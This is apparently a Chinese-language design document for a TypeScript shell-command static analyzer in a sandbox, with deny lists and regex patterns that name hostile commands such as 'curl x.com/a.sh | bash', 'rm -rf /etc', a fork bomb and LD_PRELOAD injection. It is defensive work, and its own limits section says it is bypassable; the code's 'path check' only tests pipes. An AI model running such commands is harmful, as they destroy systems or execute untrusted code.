# Shell 静态分析策略

## 概述

- **策略标识**: `"static-analyzer"`
- **安全级别**: 轻量
- **跨平台**: 全平台 (纯 TypeScript 实现)
- **执行方式**: 通过 `TerminalService` 正常执行, 执行前做静态分析

## 原理

不拦截系统调用, 不对子进程做任何修改。在将命令传递给 `TerminalService` 之前, 做三层静态分析：

```
命令字符串
  → Layer 1: 命令黑白名单
  → Layer 2: 高危模式检测 (正则匹配)
  → Layer 3: 路径访问检查
  → 通过则执行, 拒绝则返回错误
```

## 检测规则

### Layer 1: 命令黑白名单

- `allowedCommands`: 白名单 (优先级高于黑名单)
- `deniedCommands`: 黑名单 (`sudo`, `su`, `chroot`, `mount`, `dd`, `mkfs`, `reboot`, `shutdown`, `passwd`)

### Layer 2: 高危模式

| 模式 | 正则 | 检测目标 |
|------|------|---------|
| 系统文件删除 | `rm\s+(-rf?\|---recursive)\s+\/(?!workspace)` | 防止 `rm -rf /etc` |
| Fork 炸弹 | `:?\(\)\s*\{.*:\s*:\s*\};?:` | 经典 fork 炸弹 |
| 远程脚本执行 | `curl.*\|\\s*(ba)?sh` | `curl x.com/a.sh \| bash` |
| 动态库注入 | `LD_PRELOAD=` | 环境变量劫持 |
| 内联 Python 恶意代码 | `python\s+-c\s+['\"].*(?:import os|import subprocess)` | `python -c "import os"` |
| 内联 JS 恶意代码 | `node\s+-e\s+['\"].*(?:require\(['\"]fs|require\(['\"]child_process)` | `node -e "require('fs')"` |

### Layer 3: 路径访问

- `allowedReadPaths` / `allowedWritePaths` 检查命令中所有路径参数
- 仅做正则匹配, 不对文件系统做实际访问

## 核心代码

```typescript
export class ShellStaticAnalyzerStrategy implements StrategyImplementation<ScriptExecutionResult> {
  id = "static-analyzer";
  name = "Shell Static Analyzer";
  description = "Static command analysis with whitelist/blacklist and dangerous pattern detection";
  priority = 10;

  isAvailable(): boolean {
    return true; // 全平台可用
  }

  async execute(
    options: BaseExecuteOptions,
    policy: SandboxPolicy
  ): Promise<ScriptExecutionResult> {
    const command = options.command;
    const shellPolicy = policy.shell || DEFAULT_SHELL_POLICY;

    // Layer 1: 提取顶层命令
    const primaryCommand = this.extractPrimaryCommand(command);

    // 检查白名单 (如果配置了)
    if (shellPolicy.allowedCommands.length > 0) {
      if (!shellPolicy.allowedCommands.includes(primaryCommand)) {
        return this.deny(`Command not in whitelist: ${primaryCommand}`);
      }
    }

    // 检查黑名单
    if (shellPolicy.deniedCommands.includes(primaryCommand)) {
      return this.deny(`Command denied by blacklist: ${primaryCommand}`);
    }

    // Layer 2: 高危模式检测
    for (const pattern of shellPolicy.dangerousPatterns) {
      const regex = new RegExp(pattern);
      if (regex.test(command)) {
        return this.deny(`Dangerous pattern detected: ${pattern}`);
      }
    }

    // Layer 3: 路径检查
    if (shellPolicy.allowPipe === false && command.includes("|")) {
      return this.deny("Pipe operator is not allowed");
    }

    // 通过, 执行
    return this.executeCommand(command, options, policy);
  }
}
```

## 配置示例

```typescript
const config: SandboxConfig = {
  mode: "strict",
  shellStrategy: ["static-analyzer"],
  policy: {
    shell: {
      deniedCommands: ["rm", "sudo", "dd", "mkfs", "reboot"],
      dangerousPatterns: [
        "rm\\s+(-rf?|--recursive)\\s+\\/(?!workspace)",
        "LD_PRELOAD=",
      ],
      allowPipe: true,
    },
  },
};
```

## 限制

- 不能防范 `find / -delete` 等变形攻击
- 对 `eval()` 等动态构造的命令无效
- 不拦截子进程内发起的系统调用 (对 `gcc evil.c` 等编译执行无效)